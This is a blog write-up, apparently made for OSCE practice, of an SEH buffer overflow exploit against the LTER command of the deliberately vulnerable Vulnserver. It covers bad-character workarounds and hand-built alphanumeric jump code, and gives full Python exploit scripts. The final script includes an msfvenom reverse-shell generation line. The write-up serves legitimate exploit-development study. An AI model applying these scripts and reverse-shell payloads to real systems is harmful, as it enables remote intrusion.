---
title: Vulnserver LTER SEH buffer overflow
tags: OSCE
key: 20190801
comments: true
---

So one day, I was preparing for OSCE, I fire up vulnserver and try to mess around with one of their vulnerable command, LTER that I discovered by spike. Little did I know, this one is much harder than I thought.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-1.png"/>

When the POC crash, we can see that EIP is not overwritten, however, if we look at the SEH chain, we can find that it got overwritten to our payload. So, this is going to be a SEH buffer overflow.

We use pattern create and !mona findmsp to get the location of nSEH and SEH

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-2.png"/>

nSEH at 3515 and SEH at 3519, looks good. However, we only get 52 bytes after that, which clearly is not enough for a reverse shell. Looks like a job for egghunter?

With the help of !mona seh, we get the address for a pop pop retn instruction.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-3.png"/>

Here, I choose 0x6250120B which I got lucky here, you will know why later.

Then, I add a jmp short to jump over the address after the redirection to nSEH and here's where the nightmare began. 
```python
#!/usr/bin/python
import socket
import sys
#6250120B
RHOST = '192.168.170.129'
RPORT = 9999
length = 5000
string = "LTER /.:/" + "\x46" * 3515
string += "\xEB\x0B\x90\x90" + "\x0B\x12\x50\x62"
string += "\x46" * (length -len(string))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST,RPORT))
s.recv(1024)
s.send(string)
s.close()
```
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-4.png"/>

See where our short jump should be? \xEB got converted to \x6C and \x90 got converted to \x11. Since like both of them are bad characters. That's not a big deal, I can use a conditional jump instead.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-5.png"/>

Here I use \x77 to make a conditional jump when both CF and ZF are equal 0. The jump is working quite well. Before we put our shellcode inside, lets check for bad characters.

We all knew that \xEB and \x90 are bad characters, how about the others? The truth is...

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-6.png"/>

The truth is every single bytes after \x7F got converted and we cannot use them. Not even our egghunter cause after we encode it, the size will be larger that the space we have. We will need to find some way to get more space. 

How about we jump to the middle of our payload? it's possible but we can't just put \xFF in our payload and make the jump. To solve this problem, we will redirect where our ESP is pointing at and use push to push the shellcode we need. Which result in these shellcode.
```python
#!/usr/bin/python
import socket
import sys

jump = "\x60\x54\x58\x54\x5B\x66\x05\x79\x13\x50\x5C\x25\x41\x41\x41\x41\x25\x3E\x3E\x3E\x3E\x05\x41\x41\x41\x41\x66\x05\x41\x41\x66\x05\x69\x03\x50"
jump2 = "\x53\x58\x66\x05\x62\x01\x66\x05\x62\x01\x66\x05\x62\x01\x66\x05\x62\x01\x50\x5F\x04\x02\x50\x59\x66\x05\x77\x07\x66\x05\x41\x06\x50\x5C\x25\x41\x41\x41\x41\x25\x3E\x3E\x3E\x3E\x05\x41\x41\x41\x41\x66\x05\x41\x41\x66\x05\x7D\x65\x50"

RHOST = '192.168.170.129'
RPORT = 9999
length = 5000
string = "LTER /.:/" + "\x46" * 3
string += "\x53\x5C" + "\x46" * (3515-3-2-64)
string += jump2
string += "\x46" * (64-len(jump2))
string +="\x42\x42\x77\x04" + "\x0B\x12\x50\x62"
string += jump
string += "\x46" *(length - len(string))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST,RPORT))
s.recv(1024)
s.send(string)
s.close()
```
<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-7.png"/>

The first jump will redirect ESP to the end of the payload so that we can write some shellcode at the end. The distance between ESP and the end of the payload is around 0x1379 so we use eax to do the calculation and ebx to store the original value of esp.

P.S. you do not need the PUSHAD, I am just lazy to recalculate all the stuff to align ESP. just minus 32 bytes if you want to get rid of the PUSHAD

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-8.png"/>

This jump help us to create more space so that we can make a further jump to our shellcode.

The second jump looks like this.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-9.png"/>

For the second jump, we are going to jump to the very beginning of our payload. To do so, we will use ebx as a reference. Since ebx is storing the original ESP location, we can calculate the distance between and add up the values. Since it is 0x588 away, we will use eax to perform the calculation and push it to esi. After that, all we need it just a jump esi and we can execute our shellcode. Then we will align ESP so that we can push our jump esi to the stack.

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-10.png"/>

Now, with the second jump, we have over 3000 bytes of space to use and all we need is our encoded shellcode. Since, even x86/alpha_mixed cannot eliminate all bad character, we will use BufferRegister=ECX to state that the shellcode start at the absolute address of ECX. I did try with ESP but it just doesn't work. Before, I execute the shellcode, I also restore the original ESP address that we stored in EBX to avoid any error during the reverse shell with a push EBX and pop ESP. That's the reason why I will add eax by 2 bytes to push it to ECX, cause the shellcode need to reference the begin at where ECX is pointing at. 

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-11.png"/>

The shellcode is pointing at our reverse shell shellcode and if we hit run, we will get our reverse shell!!

<img class="image image--xl" src="https://raw.githubusercontent.com/xMilkPowderx/xMilkPowderx.github.io/master/assets/images/vulnserver/LTER-12.png"/>

And the final POC
```python
#!/usr/bin/python
import socket
import sys

#6250120B pop pop retn
#msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/alpha_mixed -b '\x00\x0A\x0D' BufferRegister=ECX -f c 

jump = ("\x60\x54\x58\x54\x5B\x66\x05\x79\x13"
"\x50\x5C\x25\x41\x41\x41\x41\x25\x3E"
"\x3E\x3E\x3E\x05\x41\x41\x41\x41\x66"
"\x05\x41\x41\x66\x05\x69\x03\x50")
#00000000  60                pusha
#00000001  54                push esp
#00000002  58                pop eax
#00000003  54                push esp
#00000004  5B                pop ebx
#00000005  66057913          add ax,0x1379
#00000009  50                push eax
#0000000A  5C                pop esp
#0000000B  2541414141        and eax,0x41414141
#00000010  253E3E3E3E        and eax,0x3e3e3e3e
#00000015  0541414141        add eax,0x41414141
#0000001A  66054141          add ax,0x4141
#0000001E  66056903          add ax,0x369
#00000022  50                push eax = 0x85EB4141

jump2 = ("\x53\x58\x66\x05\x62\x01\x66\x05\x62\x01"
"\x66\x05\x62\x01\x66\x05\x62\x01\x50\x5F"
"\x04\x02\x50\x59\x66\x05\x77\x07\x66\x05"
"\x41\x06\x50\x5C\x25\x41\x41\x41\x41\x25"
"\x3E\x3E\x3E\x3E\x05\x41\x41\x41\x41\x66"
"\x05\x41\x41\x66\x05\x7D\x65\x50")
#00000000  53                push ebx
#00000001  58                pop eax
#00000002  66056201          add ax,0x162
#00000006  66056201          add ax,0x162
#0000000A  66056201          add ax,0x162
#0000000E  66056201          add ax,0x162
#00000012  50                push eax
#00000013  5F                pop edi
#00000014  0402              add al,0x2
#00000016  50                push eax
#00000017  59                pop ecx
#00000018  66057707          add ax,0x777
#0000001C  66054106          add ax,0x641
#00000020  50                push eax
#00000021  5C                pop esp
#00000022  2541414141        and eax,0x41414141
#00000027  253E3E3E3E        and eax,0x3e3e3e3e
#0000002C  0541414141        add eax,0x41414141
#00000031  66054141          add ax,0x4141
#00000035  66057D65          add ax,0x657d
#00000039  50                push eax = 0xE7FF4141

shellcode = ("Shellcode here")
RHOST = '192.168.170.129'
RPORT = 9999
length = 5000
string = "LTER /.:/" + "\x46" * 3
string += "\x53\x5C" + shellcode + "\x46" * (3515-3-2-64-len(shellcode))
string += jump2
string += "\x46" * (64-len(jump2))
string +="\x42\x42\x77\x04" 
string +="\x0B\x12\x50\x62"
string += jump
string += "\x46" *(length - len(string))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST,RPORT))
s.recv(1024)
s.send(string)
s.close()
```